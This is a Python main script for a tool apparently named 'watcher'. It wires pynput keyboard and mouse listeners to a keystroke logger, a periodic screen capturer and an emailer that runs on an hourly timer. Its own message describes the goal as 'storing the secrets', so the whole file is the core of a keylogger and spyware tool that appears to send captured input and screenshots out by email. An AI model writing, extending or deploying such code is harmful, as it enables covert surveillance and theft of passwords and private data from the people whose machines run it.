import argparse
from sys import exit
from pynput import mouse,keyboard
from watcher import controllers
from watcher.events import KeyBoardEvent,MouseEvent
import watcher.tasks as tasks

def main():
    parser=argparse.ArgumentParser()

    parser.add_argument('--config_path',help="The configure json file for setting email")
    parser.add_argument('--keyfile',help="File to log keyboard's inputs")
    parser.add_argument('--screenshotfile',help="Directory to save screenshots")
    parser.add_argument("--screen_time",default=5,help="How often to screenshot")
    parser.add_argument("--n_calls",default=100,help="The number of screenshot to be captured")
    args=parser.parse_args()

    keyboardcallbacks=[]
    mousecallbacks=[]
    Emailer,Screenshoter,KeyCapturer=[None]*3
    path=r"C:\Users\PROROAD\Desktop\watcher\config.json"
    if path:
        Emailer=tasks.Emailer(config_path=path)
        Emailer.apply_decorators([controllers.timer(restart_time=60,units="HOUR")])
        mousecallbacks.append(Emailer)
    
    if args.screenshotfile:
        Screenshoter=tasks.ScreenCapturer(save_dir=r"C:\Users\PROROAD\Desktop\watcher\screens")
        Screenshoter.apply_decorators([controllers.timer(restart_time=args.screen_time),controllers.calls(args.n_calls)])
        mousecallbacks.append(Screenshoter)

    if args.keyfile:
        KeyCapturer=tasks.KeyBoardCapturer(path=args.keyfile)
        keyboardcallbacks.append(KeyCapturer)
    

    if len(mousecallbacks)>0:
        print("mouse")
        on_move=MouseEvent.on_move(mousecallbacks)
        mouse_listener=mouse.Listener(on_move=on_move)
        mouse_listener.start()

    if len(keyboardcallbacks)>0:
        on_press=KeyBoardEvent.on_press(keyboardcallbacks)
        key_listener=keyboard.Listener(on_press=on_press)
        key_listener.start()
    
    if not any([Emailer,Screenshoter,KeyCapturer]):
        print("Not have enough informations for storing the secrets")
        exit(1)

    print("Press Z for Termination:")
    while input()!="Z":continue
    if KeyCapturer:KeyCapturer.save()

if __name__=="__main__":
    main()